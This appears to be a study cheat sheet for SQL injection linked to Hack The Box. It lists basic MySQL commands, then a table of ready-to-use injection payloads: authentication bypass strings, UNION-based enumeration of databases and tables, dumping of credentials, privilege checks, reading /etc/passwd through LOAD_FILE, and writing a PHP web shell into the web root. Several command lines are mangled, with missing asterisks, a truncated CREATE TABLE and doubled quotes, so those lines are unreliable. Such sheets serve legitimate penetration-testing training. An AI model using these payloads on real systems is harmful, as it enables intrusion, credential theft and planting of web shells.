# SQL Injection

## **MySQL**

| **Command**                                                     | **Description**                                          |
| --------------------------------------------------------------- | -------------------------------------------------------- |
| **General**                                                     |                                                          |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`              | login to mysql database                                  |
| `SHOW DATABASES`                                                | List available databases                                 |
| **Tables**                                                      |                                                          |
| `USE users`                                                     | Switch to database                                       |
| `CREATE TABLE logins (id INT,`                                  | Add a new table                                          |
| `SHOW TABLES`                                                   | List available tables in current database                |
| `DESCRIBE logins`                                               | Show table properties and columns                        |
| `INSERT INTO table_name VALUES (value_1, ..)`                   | Add values to table                                      |
| `INSERT INTO table_name(column2,...) VALUES (column2_value,..)` | Add values to specific columns in a table                |
| `UPDATE table_name SET column1=newvalue1, WHERE <condition>`    | Update table values                                      |
| **Columns**                                                     |                                                          |
| `SELECT FROM table_name`                                        | Show all columns in a table                              |
| `SELECT column1, column2 FROM table_name`                       | Show specific columns in a table                         |
| `DROP TABLE logins`                                             | Delete a table                                           |
| `ALTER TABLE logins ADD newColumn INT`                          | Add new column                                           |
| `ALTER TABLE logins RENAME COLUMN newColumn To oldColumn`       | Rename column                                            |
| `ALTER TABLE logins MODIFY oldColumn DATE`                      | Change column datatype                                   |
| `ALTER TABLE logins DROP oldColumn`                             | Delete column                                            |
| **Output**                                                      |                                                          |
| `SELECT FROM logins ORDER BY column_1`                          | Sort by column                                           |
| `SELECT FROM logins ORDER BY column_1 DESC`                     | Sort by column in descending order                       |
| `SELECT FROM logins ORDER BY column_1 DESC, id ASC`             | Sort by two-columns                                      |
| `SELECT FROM logins LIMIT 2`                                    | Only show first two results                              |
| `SELECT FROM logins LIMIT 1, 2`                                 | Only show first two results starting from index 2        |
| `SELECT FROM table_name WHERE <condition>`                      | List results that meet a condition                       |
| `SELECT FROM logins WHERE username LIKE admin%'`                | List results where the name is similar to a given string |

## MySQL Operator Precedence

* Division (/), Multiplication (\*), and Modulus (%)
* Addition (+) and Subtraction (-)
* Comparison (=, >, <, <=, >=, !=, LIKE)
* NOT (!)
* AND (&&)
* OR (||)

## **SQL Injection**

<table data-header-hidden><thead><tr><th width="416"></th><th></th></tr></thead><tbody><tr><td><strong>Payload</strong></td><td><strong>Description</strong></td></tr><tr><td><strong>Auth Bypass</strong></td><td></td></tr><tr><td><code>admin' or '1'='1</code></td><td>Basic Auth Bypass</td></tr><tr><td><code>admin')--</code></td><td>Basic Auth Bypass with comments</td></tr><tr><td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td><td></td></tr><tr><td><strong>Union Injection</strong></td><td></td></tr><tr><td><code>order by 1--</code></td><td>Detect number of columns using order by</td></tr><tr><td><code>cn' UNION select 1,2,3---</code></td><td>Detect number of columns using Union injection</td></tr><tr><td><code>cn' UNION select 1, @@version, 3, 4---</code></td><td>Basic Union injection</td></tr><tr><td><code>UNION select username, 2, 3, 4 from passwords</code></td><td>Union injection for 4 columns</td></tr><tr><td><strong>DB Enumeration</strong></td><td></td></tr><tr><td><code>@@version</code></td><td>Fingerprint MySQL with query output</td></tr><tr><td><code>SLEEP (5)</code></td><td>Fingerprint MySQL with no output</td></tr><tr><td><code>cn' UNION select 1, database(),2,3---</code></td><td>Current database name</td></tr><tr><td><code>cn' UNION select 1, schema_name, 3, 4 from INFORMATION_SCHEMA.SCHEMATA--</code></td><td>List all databases</td></tr><tr><td><code>cn' UNION select 1, TABLE_NAME, TABLE_SCHEMA, 4 from INFORMATION_SCHEMA. TABLES where table_schema='dev' -- -</code></td><td>List all tables in a specific database</td></tr><tr><td><code>cn' UNION select 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--</code></td><td>List all columns in a specific table</td></tr><tr><td><code>cn' UNION select 1, username, password, 4 from dev.credentials--</code></td><td>Dump data from a table in another database</td></tr><tr><td><strong>Privileges</strong></td><td></td></tr><tr><td><code>cn' UNION SELECT 1, user(), 3, 4</code></td><td>Find current user</td></tr><tr><td><code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=""root""--</code></td><td>Find if user has admin privileges</td></tr><tr><td><code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee=""'root'@'localhost'""--</code></td><td>Find if all user privileges<sup>1</sup></td></tr><tr><td><code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=""secure_file_priv""-- -</code></td><td>Find which directories can be accessed through MySQL</td></tr><tr><td><strong>File Injection</strong></td><td></td></tr><tr><td><code>cn' UNION SELECT 1, LOAD_FILE(""/etc/passwd""), 3, 4---</code></td><td>Read local file</td></tr><tr><td><code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code></td><td>Write a string to a local file</td></tr><tr><td><code>cn' union select """", '&#x3C;?php system($_REQUEST[0]); ?>', """" into outfile '/var/www/html/shell.php'--</code></td><td>Write a web shell into the base web directory</td></tr></tbody></table>
